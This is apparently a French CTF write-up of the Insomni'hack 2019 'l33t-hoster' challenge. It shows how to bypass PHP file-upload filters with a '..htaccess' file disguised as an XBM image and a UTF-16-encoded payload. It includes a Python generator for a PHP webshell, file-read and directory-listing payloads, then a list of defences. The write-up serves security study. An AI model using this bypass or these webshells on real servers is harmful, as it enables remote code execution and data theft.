---
title: "Htaccess, ou comment contourner les mécanismes de dépôt de fichiers."
date: 2023-10-04T16:00:00+01:00
draft: false
images: [/images/bypass-file-upload/htaccess.png]
featuredImage: "/images/bypass-file-upload/htaccess.png"
featuredImagePreview: "/images/bypass-file-upload/htaccess.png"
---

# 📂 Comment contourner les mécanismes de dépôt de fichiers ?

## Introduction

Une vulnérabilité de type dépôt de fichier est une faille de sécurité permettant à un attaquant de déposer un fichier malveillant sur un système cible. Ce fichier malveillant peut ensuite être utilisé pour exécuter un code arbitraire, voler des données ou causer d'autres dommages.

Il existe de multiples façon de contourner les mécanismes de dépôt de fichier. Cet article est inspirée du challenge l33t-hoster de [l'Insomni'hack Teaser 2019 CTF](https://ctftime.org/event/686).

Alors suivez le guide !

## Exemple de code vulnérable

L'objectif du challenge était de pouvoir exécuter des commandes sur le serveur distant à l'aide de la fonctionnalité de dépôt de fichier. Or, celle-ci semble bien protégée.

Le code source de la page est donnée ci-dessous.

```php
<?php
if (isset($_GET["source"])) 
    die(highlight_file(__FILE__));

session_start();

if (!isset($_SESSION["home"])) {
    $_SESSION["home"] = bin2hex(random_bytes(20));
}
$userdir = "images/{$_SESSION["home"]}/";
if (!file_exists($userdir)) {
    mkdir($userdir);
}

$disallowed_ext = array(
    "php",
    "php3",
    "php4",
    "php5",
    "php7",
    "pht",
    "phtm",
    "phtml",
    "phar",
    "phps",
);

if (isset($_POST["upload"])) {
    if ($_FILES['image']['error'] !== UPLOAD_ERR_OK) {
        die("yuuuge fail");
    }

    $tmp_name = $_FILES["image"]["tmp_name"];
    $name = $_FILES["image"]["name"];
    $parts = explode(".", $name);
    $ext = array_pop($parts);

    if (empty($parts[0])) {
        array_shift($parts);
    }

    if (count($parts) === 0) {
        die("lol filename is empty");
    }

    if (in_array($ext, $disallowed_ext, TRUE)) {
        die("lol nice try, but im not stupid dude...");
    }

    $image = file_get_contents($tmp_name);
    if (mb_strpos($image, "<?") !== FALSE) {
        die("why would you need php in a pic.....");
    }

    if (!exif_imagetype($tmp_name)) {
        die("not an image.");
    }

    $image_size = getimagesize($tmp_name);
    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {
        die("lol noob, your pic is not l33t enough");
    }

    $name = implode(".", $parts);
    move_uploaded_file($tmp_name, $userdir . $name . "." . $ext);
}

echo "<h3>Your <a href=$userdir>files</a>:</h3><ul>";
foreach(glob($userdir . "*") as $file) {
    echo "<li><a href='$file'>$file</a></li>";
}
echo "</ul>";

?>

<h1>Upload your pics!</h1>
<form method="POST" action="?" enctype="multipart/form-data">
    <input type="file" name="image">
    <input type="submit" name=upload>
</form>
```

Le rendu de la page est relativement simple :

![Rendu site web](/images/bypass-file-upload/2023-10-05-16-29-21.png)

Pour résumer l'analyse des filtres de sécurité :

- L'application vérifie **l'extension du fichier**. Si le fichier se termine par .php ou quelque chose de similaire, il est refusé.
- L'application vérifie **le nom du fichier**. Si le nom du fichier ne peut pas être divisé en deux fois avec le séparateur .php, il est refusé.
- L'application vérifie **le contenu**. Si la chaîne `<?` est présente dans le contenu, le fichier est refusé.
- L'application vérifie **l'en-tête**. Si le fichier n'est pas une image, il est refusé.
- L'application vérifie **la taille**. Si la hauteur et la largeur du fichier ne sont pas égales à 1337, le fichier est refusé.

Comment faire ?

## Choisir le bon fichier

Pour résumer, il n'est pas possible de télécharger de fichiers avec l'extension `php`. L'objectif est donc d'obtenir la possibilité d'exécuter du code php dans un autre fichier que `.php`. Pour cela, il est possible d'utiliser un fichier `.htaccess`.

Mais qu'est-ce qu'un fichier `.htaccess` ?

> Un fichier .htaccess est un fichier de configuration qui permet de modifier le comportement d'un serveur web Apache. Il est généralement situé dans le répertoire racine d'un site web, mais il peut également être placé dans des sous-répertoires.

Plus de détails ici : https://httpd.apache.org/docs/2.4/en/howto/htaccess.html

Un fichier `.htaccess` peut avoir la configuration ci-dessous :

```bash
AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php
php_value zend.multibyte 1                  # Active specific encoding
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

1. La première ligne indique que l'on veut faire exécuter du PHP à l'aide de l'extension `.php16`.
2. La deuxième ligne indique un encodage particulier.
3. La troisième ligne indique si le fichier à un encodage particulier.
4. La quatrième ligne indique d'afficher les erreurs PHP (utile dans notre cas).

Ce fichier de configuration pourrait permettre d'obtenir une exécution de commande. Or, lors du dépôt, l'application donne l'erreur suivante :

`lol filename is empty`

En analysant le code, ce dernier divise la chaîne en deux avec `.` et vérifie s'il y a bien deux parties. Il faut donc envoyer un nom de fichier comme `..htaccess` pour contourner ce filtre.

Erreur suivante :

`not an image.`

En effet, nous ne déposons pas une image mais un fichier de configuration. Il va falloir trouver quelque chose pour contourner le code ci-dessous :

```php
if (!exif_imagetype($tmp_name)) {
    die("not an image.");
}
```

## Créer un fichier polyglotte

Qu'est-ce qu'un fichier polyglotte ?

> Un fichier polyglotte est un fichier qui peut être interprété dans plusieurs langages différents. Il s'agit généralement d'un fichier binaire qui contient des données dans plusieurs formats, tels que des instructions de code, des données de configuration ou des données de texte.

La première astuce consiste à trouver un moyen de contourner le vérificateur d'images. La documentation PHP donne une indication sur la marche à suivre : http://php.net/manual/en/function.exif-imagetype.php

En bas de la page un format semble intéressant :

![](/images/bypass-file-upload/2023-10-05-16-42-43.png)

Ok mais qu'est-ce qu'un fichier XBM ?

> X BitMap, abrégé XBM, est un format d'image numérique monochrome originellement conçu pour le système X Window, notamment pour les images de pointeur et d'icône.

La page contient un exemple :

```c
#define test_width 16
#define test_height 7
static char test_bits[] = {
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 };
```

Le format de `xbitmap` est assez clair. La taille de l'image est noté sur les premières lignes du fichier à l'aide d'un `#`. Ce format très proche du format `.htaccess` permet de contourner la fonction `exif_imagetype($tmp_name)` du programme.

Voici le contenu du nouveau fichier `..htaccess` :

```bash
#define width 1337                          # Define the width wanted by the code
#define height 1337                         # Define the height

AddType application/x-httpd-php .php16      # Say all file with extension .php16 will execute php

php_value zend.multibyte 1                  # Active specific encoding 
php_value zend.detect_unicode 1             # Detect if the file have unicode content
php_value display_errors 1                  # Display php errors
```

Le fichier est correctement traité et déposé sur le serveur !

![](/images/bypass-file-upload/2023-10-05-16-51-19.png)

## Contourner la protection anti-php

Un autre filtre empêche le dépôt de contenu PHP avec la vérification de la chaine de caractères `<?`. Or, il est possible de contourner cette protection en encodant le payload. 

En effet, PHP supporte plusieurs format d'encodage. Actuellement, l'écriture de base est en utf-8, mais PHP supporte également l'encodage utf-16. 

En utf-8, un caractère est encodé sur 1 octet.

```php
00000000: 3c3f 7068 7020 7379 7374 656d 2824 5f47  <?php system($_G
00000010: 4554 5b27 636d 6427 5d29 3b20 6469 6528  ET['cmd']); die(
00000020: 293b 203f 3e0a                           ); ?>.
```

Or, en utf-16 l'encodage est effectué sur **2 octets**.

```php
00000000: 003c 003f 0070 0068 0070 0020 0073 0079  .<.?.p.h.p. .s.y
00000010: 0073 0074 0065 006d 0028 0024 005f 0047  .s.t.e.m.(.$._.G
00000020: 0045 0054 005b 0027 0063 006d 0064 0027  .E.T.[.'.c.m.d.'
00000030: 005d 0029 003b 0020 0064 0069 0065 0028  .].).;. .d.i.e.(
00000040: 0029 003b 0020 003f 003e 0a              .).;. .?.>.
```

Il a été choisi ici un encodage **utf-16 Big Endian**. Le premier caractère `<` s'écrira donc `003c` en utf-16 au lieu de `3c` en utf-8. Avec cette astuce, le filtre est contourné.

Voici un petit script python pour automatiser la création de payload.

```python
#!/usr/bin/env python3
# Description : create and bypass file upload filter with .htaccess
# Author : Thibaud Robin

# Will prove the file is a legit xbitmap file and the size is 1337x1337
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
	phpfile = open(filename, 'wb') 
	phpfile.write(script.encode('utf-16be'))
	phpfile.write(SIZE_HEADER)
	phpfile.close()

def generate_htacess():
	htaccess = open('..htaccess', 'wb')
	htaccess.write(SIZE_HEADER)
	htaccess.write(b'AddType application/x-httpd-php .php16\n')
	htaccess.write(b'php_value zend.multibyte 1\n')
	htaccess.write(b'php_value zend.detect_unicode 1\n')
	htaccess.write(b'php_value display_errors 1\n')
	htaccess.close()
		
generate_htacess()

generate_php_file("webshell.php16", "<?php system($_GET['cmd']); die(); ?>")
generate_php_file("scandir.php16", "<?php echo implode('\n', scandir($_GET['dir'])); die(); ?>")
generate_php_file("getfile.php16", "<?php echo file_get_contents($_GET['file']); die(); ?>")
generate_php_file("info.php16", "<?php phpinfo(); die(); ?>")
```

Il n'y a plus qu'à déposer et apprécier sa webshell bien méritée. Ouf ! 😂

![](/images/bypass-file-upload/2023-10-05-16-56-26.png)

![](/images/bypass-file-upload/2023-10-05-16-56-29.png)

## Conclusion

Il est complexe de mettre en place une fonctionnalité de téléchargement de fichiers totalement sécurisée. 

Pour se protéger contre les contournements utilisés dans ce challenge, le développeur aurait pu implémenter les sécurités suivantes :
1. Utiliser les fonctions d'`ImageMagick` pour vérifier les fichiers avant de les déposer.
2. Mieux vérifier l'extension de fichier.
3. Empêcher l'interprétation des fichiers `.htaccess` dans le répertoire.
4. Installer un WAF (Web Application Firewall) comme ModSecurity de Apache.

A retenir ! Ne faites jamais confiance aux entrées utilisateurs !